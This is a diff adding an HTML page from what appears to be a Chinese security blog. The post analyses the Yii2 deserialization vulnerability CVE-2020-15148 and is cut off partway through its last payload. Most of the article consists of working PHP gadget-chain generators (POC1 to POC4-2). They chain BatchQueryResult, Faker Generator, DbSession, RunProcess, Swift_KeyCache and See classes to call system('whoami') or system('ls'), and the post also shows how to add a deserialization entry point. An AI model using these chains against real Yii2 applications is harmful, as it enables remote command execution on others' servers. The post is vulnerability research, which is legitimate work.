@@ -1,0 +1,794 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>Yii2 反序列化（CVE-2020-15148）分析 - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Yii2 反序列化（CVE-2020-15148）分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-12 22:42" pubdate>
+        July 12, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Yii2 反序列化（CVE-2020-15148）分析</h1>
+            
+            <div class="markdown-body">
+              <p>Yii是一套基于组件、用于开发大型 Web 应用的高性能 PHP 框架，Yii2 2.0.38 之前的版本存在反序列化漏洞，程序在调用unserialize()时，攻击者可通过构造特定的恶意请求执行任意命令。</p>
+<p>其应用结构如下：</p>
+<img src="/2021/07/12/filter/1.jpg" srcset="/img/loading.gif" alt="1" style="zoom: 50%;">
+<p>研究前先搭个框架，可以composer安装，不过特别慢。我是直接到github上下载的，需要修改<code>config/web.php</code>文件里<code>cookieValidationKey</code>的值，任意值即可</p>
+<p>搭完如下页面</p>
+<p><img src="/2021/07/12/filter/4.jpg" srcset="/img/loading.gif" alt="4"></p>
+<h2 id="漏洞分析"><a class="header-anchor" href="#漏洞分析">🍭</a>漏洞分析</h2>
+<p>先看github的commit记录</p>
+<p><img src="/2021/07/12/filter/5.jpg" srcset="/img/loading.gif" alt="5"></p>
+<p>从BatchQueryResults.php出发开始挖链。</p>
+<h3 id="POC1"><a class="header-anchor" href="#POC1">🍭</a>POC1</h3>
+<p>起始点一般都是能够自动调用的函数中，也就是__destruct()方法：</p>
+<p><img src="/2021/07/12/filter/2.jpg" srcset="/img/loading.gif" alt="2"></p>
+<p>调用reset()方法</p>
+<p><img src="/2021/07/12/filter/3.jpg" srcset="/img/loading.gif" alt="3"></p>
+<p><code>$this-&gt;dataReader</code>可控，可以调用不存在close()方法并且存在__call()方法的类，就是找一个跳板。全局搜索<code>__call</code>,出现了很多结果，但是最好利用的一个是<code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code>,它的<code>__call</code>方法：</p>
+<p><img src="/2021/07/12/filter/6.jpg" srcset="/img/loading.gif" alt="6"></p>
+<p>跟进format</p>
+<p><img src="/2021/07/12/filter/7.jpg" srcset="/img/loading.gif" alt="7"></p>
+<p><code>$formatter</code>与<code>$arguments</code>都不可控，再跟进getFormatter</p>
+<p><img src="/2021/07/12/filter/8.jpg" srcset="/img/loading.gif" alt="8"></p>
+<p><code>$formatter</code>传入了<code>$this-&gt;getFormatter</code>,在这个方法中，<code>$this-&gt;formatters</code>可控，则<code>getFormatter</code>方法的返回值是可控的。也就是说call_user_func_array这个函数的第一个参数可控，第二个参数为空，这里可以执行<code>phpinfo</code>：</p>
+<pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;</span>
+<span class="php"> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;</span>
+<span class="php">  <span class="hljs-keyword">private</span> $_dataReader;</span>
+<span class="php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$_dataReader</span>) </span>&#123;</span>
+<span class="php">   <span class="hljs-keyword">$this</span>-&gt;_dataReader = $_dataReader;</span>
+<span class="php">  &#125;</span>
+<span class="php"> &#125;</span>
+<span class="php">&#125;</span>
+<span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;</span>
+<span class="php"> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;</span>
+<span class="php">  <span class="hljs-keyword">protected</span> $formatters = <span class="hljs-keyword">array</span>();</span>
+<span class="php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$formatters</span>) </span>&#123;</span>
+<span class="php">   <span class="hljs-keyword">$this</span>-&gt;formatters = $formatters;</span>
+<span class="php">  &#125;</span>
+<span class="php"> &#125;</span>
+<span class="php">&#125;</span>
+<span class="php"><span class="hljs-keyword">namespace</span> &#123;</span>
+<span class="php"> $a = <span class="hljs-keyword">new</span> Faker\<span class="hljs-built_in">Generator</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;close&#x27;</span>=&gt;<span class="hljs-string">&#x27;phpinfo&#x27;</span>));</span>
+<span class="php"> $b = <span class="hljs-keyword">new</span> yii\db\BatchQueryResult($a);</span>
+<span class="php"> <span class="hljs-keyword">print</span>(urlencode(serialize($b)));</span>
+<span class="php">&#125;</span></code></pre>
+<p>接下来要寻找变量可控的rce点——&gt;找调用了call_user_func函数的无参方法,构造正则：<code>function \w+\(\) ?\n?\&#123;(.*\n)+call_user_func</code>或<code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code>进行搜索找到两个容易利用的</p>
+<ul>
+<li><code>rest/CreateAction.php</code></li>
+<li><code>rest/IndexAction.php</code></li>
+</ul>
+<h5 id="IndexAction-php"><a class="header-anchor" href="#IndexAction-php">🍭</a>IndexAction.php</h5>
+<p><img src="/2021/07/12/filter/9.jpg" srcset="/img/loading.gif" alt="9"></p>
+<p><code>$this-&gt;checkAccess</code>以及<code>$this-&gt;id</code>都可控</p>
+<p>思路：<code>__destruct</code>-&gt;<code>reset()</code>-&gt;<code>__call</code>-&gt;<code>call_user_func_array()</code>-&gt;<code>call_user_func</code>-&gt; <code>yii\rest\IndexAction::run()</code>利用了魔术方法<code>__call</code>，调用对象中不存在的方法，触发此魔术方法</p>
+<p>payload:</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;
+    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span>&#123;
+        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;
+        <span class="hljs-keyword">public</span> $id;
+
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;
+            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;
+    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;
+
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;
+        <span class="hljs-keyword">protected</span> $formatters;
+
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> CreateAction(), <span class="hljs-string">&#x27;run&#x27;</span>];
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;
+    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;
+
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;
+        <span class="hljs-keyword">private</span> $_dataReader;
+
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-keyword">namespace</span>&#123;
+    <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>));
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>payload仅仅是一个反序列化利用链，还需要一个反序列化的入口点，这个需要我们自己构造:</p>
+<p>在controllers目录下创建一个Controller:</p>
+<p><img src="/2021/07/12/filter/10.jpg" srcset="/img/loading.gif" alt="10"></p>
+<p>访问</p>
+<img src="/2021/07/12/filter/11.jpg" srcset="/img/loading.gif" alt="11" style="zoom:50%;">
+<h3 id="POC2"><a class="header-anchor" href="#POC2">🍭</a>POC2</h3>
+<p>起点和链一相同，是<code>BatchQueryResult</code>类的<code>__destruct</code>，然后是<code>$this-&gt;_dataReader-&gt;close()</code>，但是这里不找<code>__call</code>，我们顺着方向去找存在<code>close</code>方法的类，且在此类中的close方法调用了存在危险函数的方法。</p>
+<p><img src="/2021/07/12/filter/12.jpg" srcset="/img/loading.gif" alt="12"></p>
+<p>跟进<code>$this-&gt;composeFields()</code>，Dbsession类继承自MultiFieldSession类</p>
+<p><img src="/2021/07/12/filter/13.jpg" srcset="/img/loading.gif" alt="13"></p>
+<p>在上述<code>close()</code>方法中调用了父类中的<code>$this-&gt;composeFields()</code>方法。跟进父类文中的对应方法代码块：</p>
+<p><img src="/2021/07/12/filter/14.jpg" srcset="/img/loading.gif" alt="14"></p>
+<p><code>call_user_func</code>函数的官方定义中$callback参数支持已实例化的对象作为数组传递</p>
+<pre><code class="hljs reasonml">call<span class="hljs-constructor">_user_func(<span class="hljs-params">callable</span> $<span class="hljs-params">callback</span>, <span class="hljs-params">mixed</span> $<span class="hljs-params">parameter</span> = ?, <span class="hljs-params">mixed</span> $<span class="hljs-operator">...</span> = ?)</span>: mixed</code></pre>
+<p><img src="/2021/07/12/filter/15.jpg" srcset="/img/loading.gif" alt="15"></p>
+<p>故可再续上链一的无参的方法（<code>yii\rest\IndexAction::run()</code>）</p>
+<p>payload</p>
+<pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+
+<span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span> &#123;</span>
+
+<span class="php">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span></span></span>
+
+<span class="php">    &#123;</span>
+
+<span class="php">        <span class="hljs-keyword">public</span> $checkAccess;</span>
+
+<span class="php">    &#125;</span>
+
+<span class="php">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexAction</span></span></span>
+
+<span class="php">    &#123;</span>
+
+<span class="php">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$func, $param</span>)</span></span>
+
+<span class="php">        &#123;</span>
+
+<span class="php">            <span class="hljs-keyword">$this</span>-&gt;checkAccess = $func;</span>
+
+<span class="php">            <span class="hljs-keyword">$this</span>-&gt;id = $param;</span>
+
+<span class="php">        &#125;</span>
+
+<span class="php">    &#125;</span>
+
+<span class="php">&#125;</span>
+
+<span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span> &#123;</span>
+
+<span class="php">    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MultiFieldSession</span></span></span>
+
+<span class="php">    &#123;</span>
+
+<span class="php">        <span class="hljs-keyword">public</span> $writeCallback;</span>
+
+<span class="php">    &#125;</span>
+
+<span class="php">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">MultiFieldSession</span></span></span>
+
+<span class="php">    &#123;</span>
+
+<span class="php">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$func, $param</span>)</span></span>
+
+<span class="php">        &#123;</span>
+
+<span class="php">            <span class="hljs-keyword">$this</span>-&gt;writeCallback = [<span class="hljs-keyword">new</span> \yii\rest\IndexAction($func, $param), <span class="hljs-string">&quot;run&quot;</span>];</span>
+
+<span class="php">        &#125;</span>
+
+<span class="php">    &#125;</span>
+
+<span class="php">&#125;</span>
+
+<span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span> &#123;</span>
+
+<span class="php">    <span class="hljs-keyword">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">base</span>\<span class="hljs-title">BaseObject</span>;</span>
+
+<span class="php">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span></span>
+
+<span class="php">    &#123;</span>
+
+<span class="php">        <span class="hljs-keyword">private</span> $_dataReader;</span>
+
+<span class="php">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$func, $param</span>)</span></span>
+
+<span class="php">        &#123;</span>
+
+<span class="php">            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> \yii\web\DbSession($func, $param);</span>
+
+<span class="php">        &#125;</span>
+
+<span class="php">    &#125;</span>
+
+<span class="php">&#125;</span>
+
+<span class="php"><span class="hljs-keyword">namespace</span> &#123;</span>
+
+<span class="php">    $exp = <span class="hljs-keyword">new</span> \yii\db\BatchQueryResult(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>);</span>
+
+<span class="php">    <span class="hljs-keyword">echo</span>(base64_encode(serialize($exp)));</span>
+
+<span class="php">&#125;</span></code></pre>
+<h3 id="POC3"><a class="header-anchor" href="#POC3">🍭</a>POC3</h3>
+<p>以上链基于基础的yii2，新版的<code>BatchQueryResult</code>类已经被修复无法反序列化，我们可以找其他类。全局搜索<code>__destruct</code>与<code>__wakeup</code>函数，然后进行排查。</p>
+<p><img src="/2021/07/12/filter/16.jpg" srcset="/img/loading.gif" alt="16"></p>
+<p><code>$this-&gt;processes</code>可控==&gt;<code>$process</code>可控，然后下面又调用了<code>$process-&gt;isRunning</code>,又可以接上第一条利用链的<code>__call</code>方法开头的后半段。思路：<code>Codeception\Extension\RunProcess::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p>
+<p>payload</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;
+    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span>&#123;
+        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;
+        <span class="hljs-keyword">public</span> $id;
+
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;
+            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;ls&#x27;</span>;
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;
+    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;
+
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;
+        <span class="hljs-keyword">protected</span> $formatters;
+
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+            <span class="hljs-comment">// 这里需要改为isRunning</span>
+            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;isRunning&#x27;</span>] = [<span class="hljs-keyword">new</span> CreateAction(), <span class="hljs-string">&#x27;run&#x27;</span>];
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-comment">// poc2</span>
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>&#123;
+    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RunProcess</span></span>&#123;
+        <span class="hljs-keyword">private</span> $processes;
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">        </span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;processes = [<span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>()];
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-keyword">namespace</span>&#123;
+    // 生成<span class="hljs-title">poc</span>
+    <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>\<span class="hljs-title">RunProcess</span>()));
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<h3 id="POC4"><a class="header-anchor" href="#POC4">🍭</a>POC4</h3>
+<p>同样从__destruct入手找到的</p>
+<p><img src="/2021/07/12/filter/17.jpg" srcset="/img/loading.gif" alt="17"></p>
+<p>跟进clearAll</p>
+<img src="/2021/07/12/filter/18.jpg" srcset="/img/loading.gif" alt="18" style="zoom: 67%;">
+<p><code>$this-&gt;keys</code>、<code>$nsKey、$itemKey</code>都可控，跟进clearKey：</p>
+<img src="/2021/07/12/filter/19.jpg" srcset="/img/loading.gif" alt="19" style="zoom:67%;">
+<p><code>$this-&gt;path</code>也可控，而且这里是一个字符串拼接操作，则可利用魔术方法<code>__toString</code>来触发后续操作</p>
+<p>全局搜索<code>__toString</code>方法：</p>
+<p><img src="/2021/07/12/filter/20.jpg" srcset="/img/loading.gif" alt="20"></p>
+<p>跟链一一样触发__call</p>
+<p>payload</p>
+<pre><code class="hljs xquery"><span class="hljs-type">namespace</span> &#123;
+    class Swift_KeyCache_DiskKeyCache&#123;
+        private <span class="hljs-variable">$path</span>;
+        private <span class="hljs-variable">$keys</span> = [];
+        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$path</span>,<span class="hljs-variable">$keys</span>) &#123;
+            <span class="hljs-variable">$this-</span><span class="hljs-built_in">&gt;path</span> = <span class="hljs-variable">$path</span>;
+            <span class="hljs-variable">$this-</span>&gt;keys = <span class="hljs-variable">$keys</span>;
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-type">namespace</span> Codeception\Util&#123;
+    class XmlBuilder&#123;
+        protected <span class="hljs-variable">$__dom__</span>;
+        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$__dom__</span>) &#123;
+            <span class="hljs-variable">$this-</span>&gt;__dom_<span class="hljs-number">_</span> = <span class="hljs-variable">$__dom__</span>;
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-type">namespace</span> Faker&#123;
+    class Generator&#123;
+        protected <span class="hljs-variable">$formatters</span> = <span class="hljs-keyword">array</span>();
+        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$formatters</span>) &#123;
+            <span class="hljs-variable">$this-</span>&gt;formatters = <span class="hljs-variable">$formatters</span>;
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-type">namespace</span> yii\rest&#123;
+    class CreateAction&#123;
+        public <span class="hljs-variable">$checkAccess</span>;
+        public <span class="hljs-variable">$id</span>;
+        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$checkAccess</span>,<span class="hljs-variable">$id</span>)&#123;
+            <span class="hljs-variable">$this-</span>&gt;checkAccess = <span class="hljs-variable">$checkAccess</span>;
+            <span class="hljs-variable">$this-</span><span class="hljs-built_in">&gt;id</span> = <span class="hljs-variable">$id</span>;
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-type">namespace</span> &#123;
+    <span class="hljs-variable">$c</span> = new yii\rest\CreateAction(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;whoami&#x27;</span>);
+    <span class="hljs-variable">$b</span> = new Faker\Generator(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;saveXML&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$c</span>,<span class="hljs-string">&#x27;run&#x27;</span>)));
+    <span class="hljs-variable">$a</span> = new Codeception\Util\XmlBuilder(<span class="hljs-variable">$b</span>);
+    <span class="hljs-variable">$d</span> = new Swift_KeyCache_DiskKeyCache(<span class="hljs-variable">$a</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;kawhi&#x27;</span>=&gt;<span class="hljs-string">&#x27;kawhi&#x27;</span>));
+    print(urlencode(serialize(<span class="hljs-variable">$d</span>)));
+&#125;</code></pre>
+<h3 id="POC4-2"><a class="header-anchor" href="#POC4-2">🍭</a>POC4-2</h3>
+<p>__tostring入手还可找到see.php</p>
+<p><img src="/2021/07/12/filter/21.jpg" srcset="/img/loading.gif" alt="21"></p>
+<p><code>$this-&gt;description</code>可控，又可以利用<code>__call</code>，思路：</p>
+<p><code>Swift_KeyCache_DiskKeyCache -&gt; phpDocumentor\Reflection\DocBlock\Tags\See::__toString()-&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;
+    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span>&#123;
+        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;
+        <span class="hljs-keyword">public</span> $id;
+
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;
+            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;ls&#x27;</span>;
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;
+    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;
+
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;
+        <span class="hljs-keyword">protected</span> $formatters;
+
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+            <span class="hljs-comment">// 这里需要改为isRunning</span>
+            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;render&#x27;</span>] = [<span class="hljs-keyword">new</span> CreateAction(), <span class="hljs-string">&#x27;run&#x27;</span>];
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>&#123;
+
+    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;
+
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">See</span></span>&#123;
+        <span class="hljs-keyword">protected</span> $description;
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">        </span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;description = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>();
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-keyword">namespace</span>&#123;
+    <span class="hljs-title">use</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>\<span class="hljs-title">See</span>;
